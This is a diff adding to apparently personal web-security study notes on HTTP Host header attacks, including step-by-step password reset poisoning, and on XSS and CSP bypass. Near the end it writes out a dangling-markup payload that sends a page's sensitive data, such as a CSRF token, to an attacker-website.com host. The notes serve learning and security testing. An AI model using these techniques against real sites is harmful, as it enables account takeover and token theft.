@@ -215,3 +215,121 @@ Step 2: Build malicous page to exploit
 
 # HTTP Host Header Attacks
 
+- Reasons for multiple applications being hosted on a single IP address:
+    1. Virtual Hosting (VHosting)
+        ~ Multiple apps with a single owner
+        ~ Multiple apps with multiple owners (Most commonly SaaS)
+    2. Traffic Routed through Intermediary
+        ~ Apps hosted on back-end servers
+        ~ Traffic routed through load balancer or reverse proxy server
+        ~ Very common when app is accessed through Content Delivery Network (CDN)
+- What happens when you make an HTTP request in a browser?
+    1. Browser sends URL to DNS server, which responds with IP Address
+    2. Browser sends HTTP request to IP Address that contains Host Header
+    3. Web Server routes request to corresponding application based on Host Header
+- Possible vulnerabilities that can be exploited:
+    ~ Web Cache Poisoning
+    ~ Business Login Flaws
+    ~ SSRF
+    ~ Client-side Vulns (XSS, SQLi, HTMLi, etc.)
+
+## Testing for HTTP Host Header Attacks
+
+Step 1: Identify vulnerable application
+    - Supply arbitrary domain name in host header
+        If you can still access app with arbitrary domain name:
+            ~ Server may default to your target app when an unrecoginized domain name is sent
+            ~ You can now work to identify what the host header does and how it can be exploited
+        Else:
+            ~ Did the server respond with "Invalid Host header"?
+            ~ Was the request blocked due to security controls?
+            ~ Can you add a non-numeric port? (Host: vulnerable-website.com:bad-stuff-here)
+            ~ How can you manipulate the header to bypass controls? (think SSRF)
+    - Send duplicate Host headers
+        ~ Will most likely be blocked, but not always
+        EX:
+            GET /example HTTP/1.1
+            Host: vulnerable-website.com
+            Host: bad-stuff-here
+    - Send an absolute URL in the request line
+        Ex:
+            GET https://vulnerable-website.com/ HTTP/1.1
+            Host: bad-stuff-here 
+    - Can you use spacing to bypass validation filters?
+        Ex (note the space before the first Host header):
+            GET /example HTTP/1.1
+             Host: bad-stuff-here
+            Host: vulnerable-website.com
+    - Can you combine this attack with HTTP Request Smuggling?
+    - If none of these techniques work, try other headers that are commonly used in place of the Host header
+        EX: 
+            GET /example HTTP/1.1
+            Host: vulnerable-website.com
+            X-Forwarded-Host: bad-stuff-here
+        ~ X-Forwarded-Host
+        ~ X-Host
+        ~ X-Forwarded-Server
+        ~ X-HTTP-Host-Override
+        ~ Forwarded
+        ~ Burp's Param Miner extension can be used to guess additional headers
+Step 2: Identify ways to exploit vulnerable application
+    - Password Reset Poisoning
+        ~ Attacker forces the vulnerable app to send password reset link to domain under their controlled
+        ~ URL sent to the user is dynamically generated based on user controlled input
+        Step 1: Obtain victim email/username required to reset password
+        Step 2: Submit the reset password form with the Host header set to a domain the attacker controls
+        Step 3: Victim receives password reset email with poisoned URL
+        Step 4: Victim clicks the link (or link is fetched another way), sending reset token to attacker's server
+        Step 5: Sttacker visits real URL and uses stolen token to reset password
+        **Note: If you cannot manipulate the reset link, try HTMLi to manipulate the email itself and add your owner
+    - (More to come)
+
+
+# Advanced XSS
+
+- Cheat Sheet -- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+
+
+- Reflected -- Malicious script comes from current HTTP Request
+- Stored -- Malicous script comes from the application's database
+- DOM -- Vulnerability exists in the client-side code
+
+## Contexts
+- Between HTML tags
+    EX: <p>[USER CONTROLLED INPUT]</p>
+    ~ Attacker must introduce new HTML tags to trigger JavaScript
+    Step 1: Fuzz for HTML tags filtered by WAF
+    Step 2: Fuzz for attributes/events filtered by WAF
+    Step 3: Fuzz for payloads filtered by WAF
+    Step 4: Build working payload based on whitelisted tag, attr, and payload
+
+## Bypassing Content Security Policy (CSP)
+
+Common CSP Controls:
+    - Content-Security-Policy Header:
+        ~ script-src 'self' -- Only scripts from the same origin domain can be loaded
+        ~ script-src https://scripts.normal-website.com -- Only scripts from a specific domain can be loaded
+    - Nonce (random value):
+        ~ Same value must be used in the script tag, otherwise the script won't execute
+        ~ Must be securely generated each time the page loads
+        ~ Must not be guessable
+    - Hash (hash value of script being loaded)
+        ~ Script will not load if it is changed since the hash will no longer match
+- Most CSPs don't block <img> tags 
+- Dangling Markup Injection can be used to bypass CSP
+    ~ Inject HTML tags with open attr quotes so sensitive data (CSRF Token) is sent to attacker's server
+    Step 1: Identify name of input field to exploit
+    Step 2: Add GET parameter in URL with corresponding name
+    Step 3: Value of malicious parameter will be the payload
+    **IMPORTANT NOTES**
+    - Send request through Repeater, then "Show Response in Browser"
+    - Single vs Double quote is VERY important.  Double quote will end on next double quote and vice-versa
+    EX:
+        <input type="text" name="input" value="[PAYLOAD]"/>
+        [PAYLOAD] = "><img src='//attacker-website.com?
+        Resulting HTML: <input type="text" name="input" value=""><img src='//attacker-website.com?[SENSITIVE DATA]"/>
+
+
+- 
+
+
